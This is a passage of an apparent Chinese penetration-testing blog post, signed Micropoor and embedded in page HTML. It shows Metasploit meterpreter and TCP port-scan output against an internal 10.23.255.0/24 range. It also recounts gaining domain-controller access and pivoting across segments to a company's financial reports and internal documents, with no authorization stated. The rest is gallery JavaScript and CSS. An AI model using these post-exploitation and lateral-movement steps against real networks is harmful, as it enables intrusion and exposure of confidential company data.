127.0.0.1</span><br><span class="line"></span><br><span class="line">Interface 2</span><br><span class="line"></span><br><span class="line">============</span><br><span class="line">Name : Broadcom NetXtreme Gigabit Ethernet - McAfee NDIS Intermediate Filter Miniport</span><br><span class="line">Hardware MAC : 00:11:25:40:77:8f</span><br><span class="line">MTU : 1500</span><br><span class="line">IPv4 Address : 10.23.255.3 IPv4 Netmask : 255.255.255.0</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br><span class="line">Background session 3? [y/N]</span><br><span class="line"></span><br><span class="line">msf auxiliary(tcp) &gt; use auxiliary/scanner/portscan/tcp</span><br><span class="line">msf auxiliary(tcp) &gt; show options</span><br><span class="line">Module options (auxiliary/scanner/portscan/tcp):</span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">---- --------------- -------- -----------</span><br><span class="line"></span><br><span class="line">CONCURRENCY 10 yes The number of concurrent ports to check per host</span><br><span class="line">DELAY 0 yes The delay between connections, per thread, in milliseconds</span><br><span class="line">JITTER 0 yes The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.</span><br><span class="line">PORTS 445,80,3389,22 yes Ports to scan (e.g. 22-25,80,110-900)</span><br><span class="line">RHOSTS 10.23.255.1-255 yes The target address range or CIDR identifier</span><br><span class="line">THREADS 10 yes The number of concurrent threads</span><br><span class="line">TIMEOUT 1000 yes The socket connect timeout in milliseconds</span><br></pre></td></tr></table></figure>
+
+<p>最终得到了域控权限，并且得到了跨段的服务器权限。得到了个人机的重要权限，以及公司财报doc。  </p>
+<p>部分截图如下：由于时间问题，顺序可能打乱了。<br><img src="../do/media/d9c285d8edbf94e604d4e2f92fe63815.jpg" alt></p>
+<p><img src="../do/media/824a5aaac67fa081fad56b2ca579832e.jpg" alt></p>
+<p><img src="../do/media/c9f9fb2244552c5a3dca3568004ed092.jpg" alt></p>
+<p><img src="../do/media/3e0d25dfde3a692f2a49b094dfb71725.jpg" alt></p>
+<p>跳段， 个人机<br><img src="../do/media/89c46d141a5ffbd22831f3075eedf393.jpg" alt></p>
+<p><img src="../do/media/4ea97efa8ad35910d41c147a7e6eb006.jpg" alt></p>
+<p>放弃权限，所有操作并未更改，下载，删除等一切损害该公司的行为。<br><img src="../do/media/7f7f09e6ec2f6f8860b6700befeea075.jpg" alt></p>
+<p>至此由虚拟机跳段到了工作办公机，（典型的A-B-C类跳板）得到了该公司的下年计划，人员组织构架，财务报表，盈利情况，以及内部相关work文档等。</p>
+<p align="right">--By  Micropoor </p>
+
+      
+    </div>
+</article>
+
+
+
+
+
+
+
+
+    </div>
+
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" href="javascript:void(0)"></a>
+    </div>
+</div>
+<div class="acParent"></div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.0.1" ></script>
+
+<script src="//cdn.bootcss.com/photoswipe/4.1.2/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.2/photoswipe-ui-default.min.js"></script>
+
+<script src="/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'photoSwipe';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': [],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+
+        // PhotoSwipe
+        $('article').each(function(i){
+            $(this).find('img').each(function(){
+                if ($(this).closest('figure').hasClass('article-gallery-img')) {
+                    return;
+                }
+                var alt = this.alt;
+                $(this)
+                    .wrap('<figure class="article-gallery-img" itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject"></figure>')
+                    .wrap('<a href="' + this.src + '" title="' + alt + '"></a>');
+                $(this).after('<div class="img_alt"><span>' + (alt || '') + '</span></div>');
+            });
+        });
+
+        var pswpElement = document.querySelectorAll('.pswp')[0];
+        if (pswpElement) {
+            var gallerySelector = '.article-gallery, article';
+
+            var initPhotoSwipeFromDOM = function(gallerySelector) {
+
+                // parse slide data (url, title, size ...) from DOM elements
+                // (children of gallerySelector)
+                var parseThumbnailElements = function(el) {
+                    var thumbElements = $(el).find('figure.article-gallery-img').toArray(),
+                        numNodes = thumbElements.length,
+                        items = [],
+                        figureEl,
+                        linkEl,
+                        size,
+                        imgEl,
+                        item;
+
+                    for (var i = 0; i < numNodes; i++) {
+
+                        figureEl = thumbElements[i]; // <figure> element
+
+                        // include only element nodes
+                        if (figureEl.nodeType !== 1) {
+                            continue;
+                        }
+
+                        linkEl = figureEl.children[0]; // <a> element
+                        imgEl = linkEl.children[0]; // <img>
+
+                        size = linkEl.getAttribute('data-size');
+                        size = size && size.split('x');
+
+                        // create slide object
+                        item = {
+                            src: linkEl.getAttribute('href'),
+                            w: size && parseInt(size[0], 10) || imgEl.width,
+                            h: size && parseInt(size[1], 10) || imgEl.height
+                        };
+
+                        if (figureEl.children.length > 1) {
+                            // <figcaption> content
+                            item.title = figureEl.children[1].innerHTML;
+                        }
+
+                        if (linkEl.children.length > 0) {
+                            // <img> thumbnail element, retrieving thumbnail url
+                            item.msrc = linkEl.children[0].getAttribute('src');
+                        }
+
+                        item.el = figureEl; // save link to element for getThumbBoundsFn
+                        items.push(item);
+                    }
+
+                    return items;
+                };
+
+                // find nearest parent element
+                var closest = function closest(el, fn) {
+                    return el && (fn(el) ? el : closest(el.parentNode, fn));
+                };
+
+                // triggers when user clicks on thumbnail
+                var onThumbnailsClick = function(e) {
+                    e = e || window.event;
+
+                    var eTarget = e.target || e.srcElement;
+
+                    // find root element of slide
+                    var clickedListItem = closest(eTarget, function(el) {
+                        return (el.tagName && el.tagName.toUpperCase() === 'FIGURE');
+                    });
+
+                    if (!clickedListItem) {
+                        return;
+                    }
+
+                    if (e.preventDefault) {
+                        e.preventDefault();
+                    } else {
+                        e.returnValue = false;
+                    }
+
+                    // find index of clicked item by looping through all child nodes
+                    // alternatively, you may define index via data- attribute
+                    var clickedGallery = $(clickedListItem).closest(gallerySelector)[0],
+                        childNodes = $(clickedGallery).find('figure.article-gallery-img').toArray(),
+                        numChildNodes = childNodes.length,
+                        nodeIndex = 0,
+                        index;
+
+                    for (var i = 0; i < numChildNodes; i++) {
+                        if (childNodes[i].nodeType !== 1) {
+                            continue;
+                        }
+
+                        if (childNodes[i] === clickedListItem) {
+                            index = nodeIndex;
+                            break;
+                        }
+                        nodeIndex++;
+                    }
+
+
+
+                    if (index >= 0) {
+                        // open PhotoSwipe if valid index found
+                        openPhotoSwipe(index, clickedGallery);
+                    }
+                    return false;
+                };
+
+                // parse picture index and gallery index from URL (#&pid=1&gid=2)
+                var photoswipeParseHash = function() {
+                    var hash = window.location.hash.substring(1),
+                        params = {};
+
+                    if (hash.length < 5) {
+                        return params;
+                    }
+
+                    var vars = hash.split('&');
+                    for (var i = 0; i < vars.length; i++) {
+                        if (!vars[i]) {
+                            continue;
+                        }
+                        var pair = vars[i].split('=');
+                        if (pair.length < 2) {
+                            continue;
+                        }
+                        params[pair[0]] = pair[1];
+                    }
+
+                    if (params.gid) {
+                        params.gid = parseInt(params.gid, 10);
+                    }
+
+                    return params;
+                };
+
+                var openPhotoSwipe = function(index, galleryElement, disableAnimation, fromURL) {
+                    var pswpElement = document.querySelectorAll('.pswp')[0],
+                        gallery,
+                        options,
+                        items;
+
+                    items = parseThumbnailElements(galleryElement);
+
+                    // define options (if needed)
+                    options = {
+
+                        // define gallery index (for URL)
+                        galleryUID: galleryElement.getAttribute('data-pswp-uid'),
+
+                        getThumbBoundsFn: function(index) {
+                            // See Options -> getThumbBoundsFn section of documentation for more info
+                            var thumbnail = items[index].el.getElementsByTagName('img')[0], // find thumbnail
+                                pageYScroll = window.pageYOffset || document.documentElement.scrollTop,
+                                rect = thumbnail.getBoundingClientRect();
+
+                            return {
+                                x: rect.left,
+                                y: rect.top + pageYScroll,
+                                w: rect.width
+                            };
+                        }
+                    };
+
+                    // PhotoSwipe opened from URL
+                    if (fromURL) {
+                        if (options.galleryPIDs) {
+                            // parse real index when custom PIDs are used
+                            // http://photoswipe.com/documentation/faq.html#custom-pid-in-url
+                            for (var j = 0; j < items.length; j++) {
+                                if (items[j].pid == index) {
+                                    options.index = j;
+                                    break;
+                                }
+                            }
+                        } else {
+                            // in URL indexes start from 1
+                            options.index = parseInt(index, 10) - 1;
+                        }
+                    } else {
+                        options.index = parseInt(index, 10);
+                    }
+
+                    // exit if index not found
+                    if (isNaN(options.index)) {
+                        return;
+                    }
+
+                    if (disableAnimation) {
+                        options.showAnimationDuration = 0;
+                    }
+
+                    // Pass data to PhotoSwipe and initialize it
+                    gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, options);
+
+                    gallery.listen('imageLoadComplete', function(index, item) {
+                        var linkEl = item.el.children[0];
+                        var img = item.container.children[0];
+                        if (!linkEl.getAttribute('data-size')) {
+                            linkEl.setAttribute('data-size', img.naturalWidth + 'x' + img.naturalHeight);
+                            item.w = img.naturalWidth;
+                            item.h = img.naturalHeight;
+                            gallery.invalidateCurrItems();
+                            gallery.updateSize(true);
+                        }
+                    });
+
+                    gallery.init();
+                };
+
+                // loop through all gallery elements and bind events
+                var galleryElements = document.querySelectorAll(gallerySelector);
+
+                for (var i = 0, l = galleryElements.length; i < l; i++) {
+                    galleryElements[i].setAttribute('data-pswp-uid', i + 1);
+                    galleryElements[i].onclick = onThumbnailsClick;
+                }
+
+                // Parse URL and open gallery if it contains #&pid=3&gid=1
+                var hashData = photoswipeParseHash();
+                if (hashData.pid && hashData.gid) {
+                    openPhotoSwipe(hashData.pid, galleryElements[hashData.gid - 1], true, true);
+                }
+            };
+
+            // execute above function
+            initPhotoSwipeFromDOM(gallerySelector);
+        }
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+        .nav .hide-list.fullscreen {
+            left: 492px
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+
+
+    /*引用块样式*/
+    
+
+    
+</style>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe.
+         It's a separate element, as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. PhotoSwipe keeps only 3 slides in DOM to save memory. -->
+        <!-- don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <!-- Preloader demo https://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+
+
+
+
+
+</html>
